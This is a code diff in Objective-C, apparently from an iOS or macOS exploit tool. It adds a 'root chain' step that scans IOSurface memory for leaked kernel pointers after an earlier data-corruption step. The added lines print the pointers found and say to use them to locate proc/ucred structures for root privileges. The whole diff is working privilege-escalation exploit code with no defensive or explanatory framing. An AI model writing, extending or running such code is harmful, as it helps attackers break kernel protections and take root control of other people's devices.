@@ -439,6 +439,30 @@
                     } else {
                         [report appendString:@"No kernel reaction to corrupted data.\n"];
                     }
+
+                    // Root chain: scan IOSurface for kernel pointers
+                    [report appendString:@"\n--- root chain: kernel pointer scan ---\n"];
+                    int kptrsInSurface = 0;
+                    for (unsigned long j = 0; j < (rbpr * rh) / 4; j++) {
+                        unsigned int lo = p[j];
+                        unsigned int hi = (j + 1 < (rbpr * rh) / 4) ? p[j + 1] : 0;
+                        unsigned long long v = ((unsigned long long)hi << 32) | lo;
+                        if ((v >> 32) >= 0xffffffe0ULL) {
+                            kptrsInSurface++;
+                            if (kptrsInSurface <= 5) {
+                                [report appendFormat:@"kptr @ +%lu: 0x%llx\n", j * 4, v];
+                            }
+                        }
+                    }
+                    [report appendFormat:@"kernel pointers in IOSurface: %d\n", kptrsInSurface];
+
+                    if (kptrsInSurface > 0) {
+                        [report appendString:@"*** KERNEL POINTERS IN SURFACE ***\n"];
+                        [report appendString:@"Use these to find proc/ucred for root.\n"];
+                    } else {
+                        [report appendString:@"No kernel pointers in surface data.\n"];
+                        [report appendString:@"Try: different render operations, or scan after GPU work.\n"];
+                    }
                 }
                 isUnlock(surface, 0, NULL);
                 CFRelease(surface);
